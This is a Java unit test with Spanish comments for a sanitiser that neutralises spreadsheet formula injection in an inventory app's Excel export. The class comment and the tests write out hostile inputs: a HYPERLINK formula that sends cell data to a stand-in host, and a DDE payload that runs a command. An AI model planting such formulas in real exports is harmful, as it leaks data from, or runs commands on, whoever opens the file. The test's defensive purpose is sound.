package com.kardo.ingest;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

/**
 * El Excel que Kardo genera lleva texto que vino del Excel del cliente.
 *
 * <p>Si una celda empieza por {@code =}, {@code +}, {@code -} o {@code @},
 * Excel no la lee como texto sino como formula, y
 * {@code =HYPERLINK("http://x/?"&A2,"Ver")} convierte la exportacion en un
 * archivo que filtra el inventario en cuanto el contador la abre. Quien ataca
 * no necesita entrar a Kardo: le basta con que su nombre de producto llegue al
 * catalogo.
 */
class InventoryExportServiceTest {

    @Test
    @DisplayName("Los cuatro caracteres que abren una formula quedan neutralizados")
    void neutralizaFormulas() {
        assertThat(InventoryExportService.safe("=HYPERLINK(\"http://x\",\"Ver\")"))
                .isEqualTo("'=HYPERLINK(\"http://x\",\"Ver\")");
        assertThat(InventoryExportService.safe("+1+1")).startsWith("'");
        assertThat(InventoryExportService.safe("@SUM(A1:A9)")).startsWith("'");
        assertThat(InventoryExportService.safe("-2+3")).startsWith("'");

        // DDE, que es el que llega a pedir ejecutar algo
        assertThat(InventoryExportService.safe("=cmd|'/c calc'!A1")).startsWith("'");
    }

    @Test
    @DisplayName("Tabulador y retorno de carro tambien, porque algunas hojas los recortan antes de decidir")
    void neutralizaEspaciosQueEsconden() {
        assertThat(InventoryExportService.safe("\t=1+1")).startsWith("'");
        assertThat(InventoryExportService.safe("\r=1+1")).startsWith("'");
    }

    @Test
    @DisplayName("Un producto que de verdad se llama asi se sigue leyendo igual")
    void noEstropeaElTextoNormal() {
        // El apostrofo es el marcador de "esto es texto" de Excel: no se ve en
        // la celda ni viaja al copiar el valor, de modo que el arreglo no se
        // nota. Pero tampoco hay que ponerlo donde no hace falta.
        assertThat(InventoryExportService.safe("Leche Gloria 400g")).isEqualTo("Leche Gloria 400g");
        assertThat(InventoryExportService.safe("SKU-001")).isEqualTo("SKU-001");
        assertThat(InventoryExportService.safe("")).isEmpty();
        assertThat(InventoryExportService.safe(null)).isNull();
    }
}
